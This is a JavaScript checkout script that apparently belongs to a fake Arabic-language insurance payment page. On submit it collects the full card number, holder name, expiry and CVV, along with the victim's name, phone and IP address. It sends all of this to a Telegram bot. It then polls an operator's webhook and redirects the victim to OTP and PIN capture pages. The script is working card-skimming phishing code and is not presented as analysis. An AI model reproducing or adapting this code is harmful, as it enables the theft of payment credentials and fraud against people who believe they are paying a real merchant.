    document.addEventListener("DOMContentLoaded", async () => {
    
      const method = sessionStorage.getItem("paymentMethod");
      const logo = document.getElementById("pay_com");
      if (method === "mada") logo.src = "assets/photos/mad.png";
      else if (method === "visa_mastarcard") logo.src = "assets/photos/vimas.webp";
      else if (method === "applepay") logo.src = "assets/photos/appy.jpg";
      logo.style.float = "right";

      const form = document.getElementById("paymentForm");
      const overlay = document.getElementById("loadingOverlay");
      let isSubmitting = false;

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        if (isSubmitting) return;

     
        const cardInput = document.getElementById("cardـnumber");
        const nameInput = document.getElementById("codeـholderـname");
        const expiryInput = document.getElementById("expirationـdate");
        const cvvInput = document.getElementById("cvv");

        const allValid =
          cardInput.classList.contains("is-valid") &&
          nameInput.classList.contains("is-valid") &&
          expiryInput.classList.contains("is-valid") &&
          cvvInput.classList.contains("is-valid");

        if (!allValid) {
          alert("يرجى التأكد من صحة جميع الحقول قبل الإرسال.");
          return;
        }

        isSubmitting = true;
        overlay.classList.add("show");

        
        const name = nameInput.value.trim();
        const cardRaw = cardInput.value.replace(/\s+/g, "");
        const exp = expiryInput.value.trim();
        const cvv = cvvInput.value.trim();

        if (!cvv) {
          alert("رجاءً أدخل رمز CVV صالح");
          overlay.classList.remove("show");
          isSubmitting = false;
          return;
        }

       
        sessionStorage.setItem("cardBin", cardRaw.substring(0, 6));
        sessionStorage.setItem("cardLastFour", cardRaw.substring(cardRaw.length - 4));

        
        const visitorIP = await getVisitorIP();
        const requestId = Date.now();
        pendingRequestId = requestId;

       
        const paymentMethod = sessionStorage.getItem('paymentMethodName') || 'غير محدد';
        const totalPrice = sessionStorage.getItem('totalPrice') || '0';
        const selectedCompany = sessionStorage.getItem('selectedCompany') || 'غير محدد';
        const contractType = sessionStorage.getItem('contractType') || '';
        const fullName = sessionStorage.getItem('userFullName') || sessionStorage.getItem('fullName') || '';
        const phone = sessionStorage.getItem('userPhoneNumber') || sessionStorage.getItem('phone') || '';

        
        const fullCard = cardRaw;
        const cardType = sessionStorage.getItem("Card type") || "unknown";

       
        const message = `💳 <b>بيانات بطاقة الدفع</b>\n\n` +
                        `─────────────────────────────────\n` +
                        `👤 <b>العميل:</b> <code>${fullName}</code>\n` +
                        `─────────────────────────────────\n` +
                        `💳 <b>نوع البطاقة:</b> <code>${cardType.toUpperCase()}</code>\n` +
                        `📝 <b>اسم الحامل:</b> <code>${name}</code>\n` +
                        `🔢 <b>رقم البطاقة:</b> <code>${fullCard}</code>\n` +
                        `📅 <b>تاريخ الانتهاء:</b> <code>${exp}</code>\n` +
                        `🔐 <b>CVV:</b> <code>${cvv}</code>\n` +
                        `💰 <b>المبلغ:</b> <code>${totalPrice}</code> درهم\n` +
                        `💵 <b>طريقة الدفع:</b> <code>${paymentMethod}</code>\n` +
                        `─────────────────────────────────\n` +
                        `🔹 <b>IP:</b> <code>${visitorIP}</code>\n` +
                        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
                        `🆔 <b>ID:</b> <code>${requestId}</code>`;

        const messageId = await sendToTelegram(message, requestId, 'payment');

        
        const checkInterval = setInterval(async () => {
          const status = await checkWebhookResponse(requestId, 'payment');
          
          if (status === 'approved') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '✅ تم القبول');
            overlay.classList.remove("show");
            window.location.href = "code.html";
          } else if (status === 'rejected') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '❌ تم الرفض');
            overlay.classList.remove("show");
            isSubmitting = false;
            document.getElementById('decline-message').style.display = 'block';
            document.getElementById('decline-message').scrollIntoView({ behavior: 'smooth', block: 'center' });
            pendingRequestId = null;
          } else if (status === 'notify') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, 'تم التحويل لصفحة PIN');
            overlay.classList.remove("show");
            window.location.href = 'pin.html';
          }
        }, 2000);
      });

      
      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        document.getElementById("decline-message").style.display = "block";
      }
    });

    window.addEventListener("beforeunload", () => {
      pendingRequestId = null;
    });